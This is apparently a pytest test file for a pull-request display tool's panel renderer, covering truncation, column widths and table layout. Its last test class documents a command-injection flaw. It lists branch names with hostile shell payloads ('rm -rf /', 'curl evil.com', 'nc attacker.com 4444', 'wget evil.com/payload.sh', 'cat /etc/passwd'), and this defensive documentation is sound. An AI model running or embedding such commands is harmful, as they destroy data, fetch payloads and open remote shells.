"""
Unit tests for panel renderer module.

Tests panel creation, width calculations, Rich Text handling, and security vulnerabilities.
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
from rich.text import Text
from rich.console import Console
from rich.table import Table

from prs.core.display.panel_renderer import (
    create_panel_title,
    create_panel_subtitle,
    truncate_rich_text,
    calculate_dynamic_widths,
    should_use_table_layout,
    collect_normal_items,
    collect_long_items,
    create_table_layout,
    assemble_panel_content,
    FEATURE_CHARACTER_LIMITS,
    MAX_TITLE_LENGTH
)


class TestPanelTitleCreation:
    """Tests for panel title creation and formatting."""

    def create_mock_pr(self, pr_id=123, title="Test PR Title"):
        """Helper to create mock PR."""
        pr = Mock()
        pr.id = pr_id
        pr.title = title
        return pr

    @patch('prs.core.display.panel_renderer.compute_open_status')
    @patch('prs.core.display.panel_renderer.format_title')
    def test_basic_title_creation(self, mock_format_title, mock_compute_open_status):
        """Basic panel title creation with styling."""
        mock_compute_open_status.return_value = ("OPEN", "green")
        mock_format_title.return_value = "Formatted Title"
        
        pr = self.create_mock_pr(123, "Test Title")
        result = create_panel_title(pr)

        assert isinstance(result, Text)
        mock_compute_open_status.assert_called_once_with(pr)
        mock_format_title.assert_called_once_with("Test Title")

    @patch('prs.core.display.panel_renderer.compute_open_status')
    @patch('prs.core.display.panel_renderer.format_title')
    def test_title_truncation_when_too_long(self, mock_format_title, mock_compute_open_status):
        """Title truncated when exceeding MAX_TITLE_LENGTH."""
        mock_compute_open_status.return_value = ("OPEN", "green")
        long_title = "x" * (MAX_TITLE_LENGTH + 10)
        mock_format_title.return_value = long_title
        
        pr = self.create_mock_pr(123, long_title)
        result = create_panel_title(pr)

        # Title should be truncated with ellipsis
        assert len(result.plain) <= MAX_TITLE_LENGTH
        assert result.plain.endswith("...")

    @patch('prs.core.display.panel_renderer.compute_open_status')
    @patch('prs.core.display.panel_renderer.format_title')
    def test_title_exactly_max_length(self, mock_format_title, mock_compute_open_status):
        """Title at exactly MAX_TITLE_LENGTH not truncated."""
        mock_compute_open_status.return_value = ("OPEN", "green")
        exact_length_title = "x" * (MAX_TITLE_LENGTH - 10)  # Account for PR number and status
        mock_format_title.return_value = exact_length_title
        
        pr = self.create_mock_pr(123, exact_length_title)
        result = create_panel_title(pr)

        # Should not end with ellipsis if it fits
        # (Though it might still be truncated due to PR number length)
        assert isinstance(result, Text)

    @patch('prs.core.display.panel_renderer.compute_open_status')
    @patch('prs.core.display.panel_renderer.format_title')
    def test_title_with_special_characters(self, mock_format_title, mock_compute_open_status):
        """Title with special characters handled properly."""
        mock_compute_open_status.return_value = ("DRAFT", "yellow")
        special_title = "Fix: Handle émojis 🚀 and ñice unicode"
        mock_format_title.return_value = special_title
        
        pr = self.create_mock_pr(456, special_title)
        result = create_panel_title(pr)

        assert isinstance(result, Text)
        # Should contain PR number formatting
        assert "#000456" in result.plain


class TestPanelSubtitle:
    """Tests for panel subtitle creation."""

    def create_mock_pr(self, url="https://github.com/test/repo/pull/123"):
        """Helper to create mock PR."""
        pr = Mock()
        pr.url = url
        return pr

    def test_subtitle_with_url_mode_normal(self):
        """Subtitle shows URL when pr_url mode is not 'none'."""
        pr = self.create_mock_pr()
        modes = {"pr_url": "normal"}
        
        result = create_panel_subtitle(pr, modes)
        
        assert isinstance(result, Text)
        assert pr.url in result.plain

    def test_subtitle_with_url_mode_none(self):
        """Subtitle returns None when pr_url mode is 'none'."""
        pr = self.create_mock_pr()
        modes = {"pr_url": "none"}
        
        result = create_panel_subtitle(pr, modes)
        
        assert result is None

    def test_subtitle_with_different_modes(self):
        """Subtitle handles different pr_url modes consistently."""
        pr = self.create_mock_pr()
        
        for mode in ["short", "normal", "long"]:
            modes = {"pr_url": mode}
            result = create_panel_subtitle(pr, modes)
            assert isinstance(result, Text)
            assert pr.url in result.plain


class TestRichTextTruncation:
    """Tests for Rich Text truncation with style preservation."""

    def test_truncate_empty_text(self):
        """Empty text returned unchanged."""
        text = Text("")
        result = truncate_rich_text(text, 10)
        assert result.plain == ""

    def test_truncate_none_text(self):
        """None text handled gracefully."""
        result = truncate_rich_text(None, 10)
        assert result is None

    def test_truncate_zero_max_chars(self):
        """Zero max_chars returns original text."""
        text = Text("Hello World")
        result = truncate_rich_text(text, 0)
        assert result.plain == "Hello World"

    def test_truncate_negative_max_chars(self):
        """Negative max_chars returns original text."""
        text = Text("Hello World")
        result = truncate_rich_text(text, -5)
        assert result.plain == "Hello World"

    def test_truncate_text_fits_exactly(self):
        """Text that fits exactly is not truncated."""
        text = Text("Hello")
        result = truncate_rich_text(text, 5)
        assert result.plain == "Hello"

    def test_truncate_text_fits_under_limit(self):
        """Text under limit is not truncated."""
        text = Text("Hi")
        result = truncate_rich_text(text, 10)
        assert result.plain == "Hi"

    def test_truncate_very_small_limit(self):
        """Very small limits (<=3) return just ellipsis."""
        text = Text("Hello World")
        
        result1 = truncate_rich_text(text, 1)
        assert result1.plain == "..."
        
        result2 = truncate_rich_text(text, 2)
        assert result2.plain == "..."
        
        result3 = truncate_rich_text(text, 3)
        assert result3.plain == "..."

    def test_truncate_with_ellipsis(self):
        """Text truncated with ellipsis appended."""
        text = Text("Hello World")
        result = truncate_rich_text(text, 8)
        assert result.plain == "Hello..."
        assert len(result.plain) == 8

    def test_truncate_preserves_basic_styling(self):
        """Basic styling preservation during truncation."""
        text = Text("Hello World", style="red")
        result = truncate_rich_text(text, 8)
        
        assert result.plain == "Hello..."
        # Check that some styling is preserved (basic test)
        assert len(result._spans) > 0  # Has some styling spans

    def test_truncate_multiline_content(self):
        """Multiline content truncated at character boundary."""
        text = Text("Line 1\nLine 2\nLine 3")
        result = truncate_rich_text(text, 10)
        
        assert result.plain == "Line 1\nL..."
        assert len(result.plain) == 10

    def test_truncate_with_complex_styling(self):
        """Complex styling handled during truncation."""
        text = Text()
        text.append("Hello", style="red")
        text.append(" World", style="blue")
        
        result = truncate_rich_text(text, 8)
        assert result.plain == "Hello..."


class TestDynamicWidthCalculation:
    """Tests for dynamic width calculation engine."""

    def test_invalid_console_width_uses_default(self):
        """Invalid console width uses default value."""
        widths = calculate_dynamic_widths(0, True, 1)
        # Should use default width (120)
        assert sum(widths) == 120
        
        widths = calculate_dynamic_widths(-10, True, 1)
        assert sum(widths) == 120

    def test_very_narrow_console_uses_minimum(self):
        """Very narrow console uses minimum width."""
        widths = calculate_dynamic_widths(50, True, 1)
        # Should be adjusted to minimum (80)
        assert sum(widths) == 80

    def test_normal_only_scenario(self):
        """Normal-only scenario gets 100% width."""
        console_width = 120
        widths = calculate_dynamic_widths(console_width, True, 0)
        
        normal_width, long1_width, long2_width, long3_width = widths
        assert normal_width == console_width
        assert long1_width == 0
        assert long2_width == 0
        assert long3_width == 0

    def test_long_only_scenarios(self):
        """Long-only scenarios distribute evenly."""
        console_width = 120
        
        # 1 long column
        widths = calculate_dynamic_widths(console_width, False, 1)
        assert widths == (0, 120, 0, 0)
        
        # 2 long columns
        widths = calculate_dynamic_widths(console_width, False, 2)
        assert widths == (0, 60, 60, 0)
        
        # 3 long columns
        widths = calculate_dynamic_widths(console_width, False, 3)
        assert widths == (0, 40, 40, 40)

    def test_one_normal_one_long_scenario(self):
        """1 normal + 1 long scenario with 60% max for normal."""
        console_width = 100
        widths = calculate_dynamic_widths(console_width, True, 1)
        
        normal_width, long1_width, long2_width, long3_width = widths
        assert normal_width <= 60  # Max 60%
        assert long1_width >= 20   # Minimum for long
        assert normal_width + long1_width == console_width
        assert long2_width == 0
        assert long3_width == 0

    def test_multiple_columns_percentage_ranges(self):
        """Multiple columns respect percentage ranges."""
        console_width = 200
        widths = calculate_dynamic_widths(console_width, True, 2)
        
        normal_width, long1_width, long2_width, long3_width = widths
        
        # Normal should be in 25-30% range for multiple columns
        assert console_width * 0.25 <= normal_width <= console_width * 0.30
        assert long1_width > 0
        assert long2_width > 0
        assert long3_width == 0
        assert sum(widths) == console_width

    def test_console_width_breakpoints(self):
        """Different console widths use appropriate percentages."""
        # Very wide displays (≥200)
        widths = calculate_dynamic_widths(250, True, 2)
        normal_width = widths[0]
        normal_percentage = normal_width / 250
        # Should use lower percentage for very wide displays
        assert 0.30 <= normal_percentage <= 0.40

        # Standard displays (120-159)
        widths = calculate_dynamic_widths(140, True, 2)
        normal_width = widths[0]
        normal_percentage = normal_width / 140
        assert 0.35 <= normal_percentage <= 0.50

    def test_remainder_distribution(self):
        """Remainder distributed to first columns."""
        console_width = 121  # Odd number to create remainder
        widths = calculate_dynamic_widths(console_width, False, 3)
        
        # 121 / 3 = 40 remainder 1
        # First column should get the extra character
        assert widths[1] >= 40  # First long column
        assert sum(widths) == 121

    def test_maximum_long_columns_capped(self):
        """More than 3 long columns capped at 3."""
        console_width = 120
        widths = calculate_dynamic_widths(console_width, False, 5)
        
        # Only first 3 long columns should have width
        assert widths[1] > 0  # long1
        assert widths[2] > 0  # long2
        assert widths[3] > 0  # long3
        # Note: tuple only has 4 elements (normal + 3 long)

    def test_width_sum_invariant(self):
        """Widths always sum to console_width."""
        test_cases = [
            (80, True, 1), (120, True, 2), (160, False, 3),
            (200, True, 3), (79, True, 1), (500, False, 2)
        ]
        
        for console_width, has_normal, num_long in test_cases:
            widths = calculate_dynamic_widths(console_width, has_normal, num_long)
            expected_width = max(console_width, 80)  # Minimum constraint
            assert sum(widths) == expected_width

    def test_fallback_scenarios(self):
        """Fallback scenarios handled gracefully."""
        # Edge case: no content at all
        widths = calculate_dynamic_widths(120, False, 0)
        # Should return some reasonable default
        assert sum(widths) == 120

        # Very large num_long (should be capped)
        widths = calculate_dynamic_widths(120, True, 10)
        assert sum(widths) == 120


class TestTableLayoutDecision:
    """Tests for table layout decision logic."""

    def test_should_use_table_empty_modes(self):
        """Empty modes dictionary returns False."""
        assert should_use_table_layout({}) == False
        assert should_use_table_layout(None) == False

    def test_should_use_table_no_table_modes(self):
        """No normal/long modes returns False."""
        modes = {
            "checks": "none",
            "reviews": "short", 
            "labels": "none"
        }
        assert should_use_table_layout(modes) == False

    def test_should_use_table_with_normal_modes(self):
        """Normal modes trigger table layout."""
        modes = {
            "checks": "normal",
            "reviews": "short",
            "labels": "none"
        }
        assert should_use_table_layout(modes) == True

    def test_should_use_table_with_long_modes(self):
        """Long modes trigger table layout."""
        modes = {
            "checks": "short",
            "reviews": "long",
            "labels": "none"
        }
        assert should_use_table_layout(modes) == True

    def test_should_use_table_mixed_modes(self):
        """Mixed normal and long modes trigger table layout."""
        modes = {
            "checks": "normal",
            "reviews": "long",
            "labels": "short"
        }
        assert should_use_table_layout(modes) == True

    def test_should_use_table_irrelevant_modes(self):
        """Irrelevant modes don't affect decision."""
        modes = {
            "checks": "normal",
            "pr_url": "long",  # Not checked by function
            "branch": "normal",  # Not checked by function
            "author": "long"  # Not checked by function
        }
        assert should_use_table_layout(modes) == True


class TestContentCollection:
    """Tests for content collection functions."""

    def create_mock_pr(self):
        """Helper to create mock PR."""
        pr = Mock()
        pr.id = 123
        pr.title = "Test PR"
        pr.checks = []
        pr.reviews = []
        pr.labels = []
        return pr

    @patch('prs.core.display.panel_renderer.render_checks_detail')
    @patch('prs.core.display.panel_renderer.render_reviews_detail')
    @patch('prs.core.display.panel_renderer.render_labels_detail')
    def test_collect_normal_items(self, mock_labels, mock_reviews, mock_checks):
        """Normal items collected based on modes."""
        pr = self.create_mock_pr()
        modes = {
            "checks": "normal",
            "reviews": "short",  # Should not be collected
            "labels": "normal"
        }
        
        mock_checks.return_value = Text("Checks normal")
        mock_reviews.return_value = Text("Reviews should not appear")
        mock_labels.return_value = Text("Labels normal")
        
        items = collect_normal_items(pr, modes)
        
        assert len(items) == 2
        mock_checks.assert_called_once_with(pr, "normal", modes)
        mock_labels.assert_called_once_with(pr, "normal", modes)
        mock_reviews.assert_called_once_with(pr, "short", modes)  # Called but not collected

    @patch('prs.core.display.panel_renderer.render_checks_detail')
    @patch('prs.core.display.panel_renderer.render_reviews_detail')
    @patch('prs.core.display.panel_renderer.render_labels_detail')
    def test_collect_long_items_with_priority(self, mock_labels, mock_reviews, mock_checks):
        """Long items collected with priority ordering."""
        pr = self.create_mock_pr()
        modes = {
            "checks": "long",
            "reviews": "long",
            "labels": "long"
        }
        
        mock_checks.return_value = Text("Checks long")
        mock_reviews.return_value = Text("Reviews long")
        mock_labels.return_value = Text("Labels long")
        
        items = collect_long_items(pr, modes)
        
        # Should be in priority order: Checks > Reviews > Labels
        assert len(items) == 3
        assert items[0][0] == "Checks"
        assert items[1][0] == "Reviews"
        assert items[2][0] == "Labels"

    @patch('prs.core.display.panel_renderer.render_checks_detail')
    def test_collect_items_with_none_content(self, mock_checks):
        """None content filtered out from collections."""
        pr = self.create_mock_pr()
        modes = {"checks": "normal"}
        
        mock_checks.return_value = None
        
        items = collect_normal_items(pr, modes)
        assert len(items) == 0

    def test_collect_items_empty_modes(self):
        """Empty modes return empty collections."""
        pr = self.create_mock_pr()
        
        normal_items = collect_normal_items(pr, {})
        long_items = collect_long_items(pr, {})
        
        assert len(normal_items) == 0
        assert len(long_items) == 0

    def test_collect_items_none_pr(self):
        """None PR handled gracefully."""
        normal_items = collect_normal_items(None, {"checks": "normal"})
        long_items = collect_long_items(None, {"checks": "long"})
        
        assert len(normal_items) == 0
        assert len(long_items) == 0


class TestTableCreation:
    """Tests for table creation and layout."""

    def test_create_table_empty_content(self):
        """Empty content creates valid table structure."""
        table = create_table_layout([], [], 120)
        
        assert isinstance(table, Table)
        # Should have no columns for empty content
        assert len(table.columns) == 0

    def test_create_table_normal_items_only(self):
        """Normal items only create single column table."""
        normal_items = [Text("Normal content 1"), Text("Normal content 2")]
        long_items = []
        
        table = create_table_layout(normal_items, long_items, 120)
        
        assert isinstance(table, Table)
        assert len(table.columns) == 1

    def test_create_table_long_items_only(self):
        """Long items only create appropriate columns."""
        normal_items = []
        long_items = [
            ("Checks", Text("Check content")),
            ("Reviews", Text("Review content"))
        ]
        
        table = create_table_layout(normal_items, long_items, 120)
        
        assert isinstance(table, Table)
        assert len(table.columns) == 2

    def test_create_table_mixed_content(self):
        """Mixed normal and long items create appropriate layout."""
        normal_items = [Text("Normal content")]
        long_items = [
            ("Checks", Text("Check content")),
            ("Reviews", Text("Review content"))
        ]
        
        table = create_table_layout(normal_items, long_items, 120)
        
        assert isinstance(table, Table)
        assert len(table.columns) == 3  # 1 normal + 2 long

    def test_create_table_width_constraints(self):
        """Table respects width constraints."""
        normal_items = [Text("Normal")]
        long_items = [("Checks", Text("Long"))]
        
        # Test with different console widths
        for width in [80, 120, 200]:
            table = create_table_layout(normal_items, long_items, width)
            assert isinstance(table, Table)

    def test_create_table_maximum_long_columns(self):
        """Maximum of 3 long columns enforced."""
        normal_items = [Text("Normal")]
        long_items = [
            ("Checks", Text("Check 1")),
            ("Reviews", Text("Review 1")),
            ("Labels", Text("Label 1")),
            ("Extra", Text("Should not appear")),  # 4th column
            ("More", Text("Should not appear"))    # 5th column
        ]
        
        table = create_table_layout(normal_items, long_items, 200)
        
        # Should have 1 normal + 3 long = 4 columns max
        assert len(table.columns) <= 4

    def test_create_table_console_width_edge_cases(self):
        """Edge cases for console width handled."""
        normal_items = [Text("Normal")]
        long_items = [("Checks", Text("Long"))]
        
        # Zero width uses default
        table = create_table_layout(normal_items, long_items, 0)
        assert isinstance(table, Table)
        
        # Negative width uses default
        table = create_table_layout(normal_items, long_items, -10)
        assert isinstance(table, Table)


class TestSecurityVulnerabilities:
    """Tests for security vulnerabilities in panel rendering."""

    @patch('prs.core.display.panel_renderer.render_branch_info')
    def test_command_injection_vulnerability(self, mock_render_branch):
        """Test command injection vulnerability in branch URLs."""
        # This test identifies the security vulnerability mentioned by expert analysis
        
        # Mock a PR with malicious branch name
        pr = Mock()
        pr.branch = "feature-branch; rm -rf /"  # Command injection attempt
        pr.role = "author"
        
        # The vulnerability is in render_branch_info creating URLs like:
        # url=f"command:git checkout {pr.branch}"
        # Which would become: "command:git checkout feature-branch; rm -rf /"
        
        mock_render_branch.return_value = Text("Branch with command injection")
        
        # Call the function that would trigger the vulnerability
        from prs.core.display.panel_renderer import render_pr_panel
        
        # Test that the function at least doesn't crash with malicious input
        # In a real security test, we'd verify the URL is properly sanitized
        console = Mock()
        modes = {"branch": "normal"}
        
        # This should not execute the malicious command
        render_pr_panel(pr, modes, console)
        
        # Verify the render function was called with the PR
        mock_render_branch.assert_called_once()

    def test_branch_name_command_injection_patterns(self):
        """Test various command injection patterns in branch names."""
        dangerous_branch_names = [
            "branch; rm -rf /",
            "branch && curl evil.com",
            "branch | nc attacker.com 4444",
            "branch$(curl http://evil.com)",
            "branch`curl http://evil.com`",
            "branch; cat /etc/passwd",
            "branch || wget evil.com/payload.sh",
        ]
        
        for branch_name in dangerous_branch_names:
            pr = Mock()
            pr.branch = branch_name
            
            # In a secure implementation, these should be sanitized
            # For now, we just verify the code doesn't crash
            url = f"command:git checkout {pr.branch}"
            
            # The vulnerability exists - this URL would be dangerous if executed
            assert "command:" in url
            assert pr.branch in url
            
            # This test documents the vulnerability exists
            # In production, branch names should be validated/sanitized

    def test_url_construction_sanitization(self):
        """Test URL construction with potentially unsafe input."""
        test_cases = [
            ("normal-branch", True),      # Safe branch name
            ("feature/fix-bug", True),    # Safe with slash
            ("branch with spaces", False), # Potentially problematic
            ("branch;rm-rf", False),      # Command characters
            ("branch&test", False),       # Shell metacharacters
        ]
        
        for branch_name, should_be_safe in test_cases:
            url = f"command:git checkout {branch_name}"
            
            # In a secure implementation, unsafe characters should be escaped
            # This test documents what patterns need sanitization
            has_shell_chars = any(char in branch_name for char in [';', '&', '|', '$', '`'])
            
            if has_shell_chars:
                # These URLs are potentially dangerous
                assert not should_be_safe, f"Branch '{branch_name}' should be considered unsafe"

    def test_hyperlink_security_implications(self):
        """Test security implications of hyperlink creation."""
        from rich.text import Text
        
        # Test that Rich Text hyperlinks with command: URLs work as expected
        # This confirms the vulnerability vector exists
        
        text = Text("Click here")
        dangerous_url = "command:git checkout branch; rm -rf /"
        text.stylize_range(0, len(text), url=dangerous_url)
        
        # The hyperlink is created successfully with the dangerous URL
        assert text._spans[0].url == dangerous_url
        
        # This demonstrates that the Rich library will accept command: URLs
        # The security issue is in the application code creating these URLs